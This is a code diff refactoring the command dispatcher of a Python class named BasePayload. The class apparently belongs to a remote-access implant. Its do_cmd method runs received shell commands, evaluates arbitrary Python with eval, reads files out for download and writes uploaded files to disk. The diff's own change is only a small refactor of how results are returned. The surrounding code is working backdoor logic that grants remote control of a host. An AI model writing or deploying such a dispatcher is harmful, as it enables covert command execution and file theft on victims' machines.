@@ -8,23 +8,24 @@ class BasePayload(object):
 		self.decrypt = crypto.decrypt
 		self.exit_trigger = False
 	def do_cmd(self, cmd):
+		res = cmd
 		if cmd['type'] == 'sh':
-			cmd['res'] = utils.sh(cmd['cmd'])
-			return cmd
+			res['res'] = utils.sh(cmd['cmd'])
+			return res
 		elif cmd['type'] == 'eval':
 			try:
 				r = eval(cmd['cmd'])
 			except Exception as e:
 				r = e
-			cmd['res'] = r
-			return cmd
+			res['res'] = r
+			return res
 		elif cmd['type'] == 'dl':
 			try:
 				fd = open(cmd['fn'],'rb').read()
 			except Exception as e:
 				fd = e
-			cmd['res'] = fd
-			return cmd
+			res['res'] = fd
+			return res
 		elif cmd['type'] == 'ul':
 			try:
 				with open(cmd['fn'],'wb') as f:
@@ -32,14 +33,15 @@ class BasePayload(object):
 				r = True
 			except Exception as e:
 				r = e
-			cmd['res'] = r
-			return cmd
+			res['res'] = r
+			return res
 		elif cmd['type'] == 'exit':
-			cmd['res'] = 'okay'
+			res['res'] = 'okay'
 			self.exit_trigger = True
-			return cmd
+			return res
 		else:
-			cmd['res'] = "invalid type: "+cmd['type']
+			res['res'] = "invalid type: "+cmd['type']
+			return res
 	def run(self):
 		while True:
 			try:
